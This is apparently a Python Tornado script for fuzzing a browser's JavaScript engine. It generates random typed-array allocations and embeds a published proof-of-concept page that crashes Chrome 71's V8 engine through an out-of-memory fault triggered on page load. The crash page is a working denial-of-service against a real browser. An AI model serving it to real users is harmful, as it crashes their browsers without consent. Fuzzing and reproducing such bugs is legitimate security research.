import tornado.ioloop
import tornado.web
import random
import os

TYPEDARRAY_TYPES = ['Array', 'Int8Array', 'Uint8Array', 'Uint8ClampedArray', 'Int16Array', 'Uint16Array', 'Int32Array', 'Uint32Array', 'Float32Array', 'Float64Array']

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        # page = generate_page()
        # print(page)
        # with open('test/46042.html', 'r') as page:
            # print(page.read())
        print(self.request.uri)
        print(self.request.uri[1:])
        self.render("test/46042.html")

def make_app():
    return tornado.web.Application([
        (r"/fuzzyou", MainHandler),
    ])

def rand_num():
    divisor = random.randrange(0x8) + 1
    dividend = (0x100000000) / divisor
    if random.randrange(3) == 0:
        addend = random.randrange(10)
        addend -= 5
        dividend += addend
    return dividend

def generate_assignment():
    vtype = random.choice(TYPEDARRAY_TYPES)
    return "var arr2 = new %s(arr1);" % vtype

def generate_var():
    vtype = random.choice(TYPEDARRAY_TYPES)
    vlen = rand_num()
    return "var arr1 = new %s(%d); " % (vtype, vlen)

def generate_js():
    js = ""
    js += "   try { " + generate_var() + " } catch(e) {console.log(e)} "

    js += "   try { " + generate_assignment() + " } catch(e){ console.log(e)} "
    return js

def generate_page():
    # js = generate_js()
#     page = """
# <html>
# <head>
# <script>

# function main() {

# var ar = [];

#     while(let i = 0; i < 0x20000000; ++i){
#         ar[i]+=i;
#     } 
# }
# </script>
# </head>
# <body onload=main()></body>
# </html>
# """
    page = """
<!--
# Exploit Title: Google Chrome 71.0.3578.98 V8 JavaScript Engine - Out-of-memory. Denial of Service (PoC)
# Google Dork: N/A
# Date: 2018-12-23
# Exploit Author: Bogdan Kurinnoy (b.kurinnoy@gmail.com)
# Vendor Homepage: https://www.google.com/
# Version: Google Chrome 71.0.3578.98, V8 version 7.3.0 (candidate)
# Tested on: Windows x64
# CVE : N/A

# Description:

# Fatal javascript OOM in CALL_AND_RETRY_LAST

# https://bugs.chromium.org/p/chromium/issues/detail?id=917631
-->

<html>
<head>
<script>

function main() {

var vArr = new Array();
var bigArray = new Array(0x20000000);
vArr[0] = String.prototype.toLowerCase.call(bigArray);
vArr[1] = String.prototype.toLowerCase.call(bigArray);
vArr[2] = String.prototype.toLowerCase.call(bigArray);

}
</script>
</head>
<body onload=main()></body>
</html>

"""
    return page

if __name__ == "__main__":
    app = make_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()



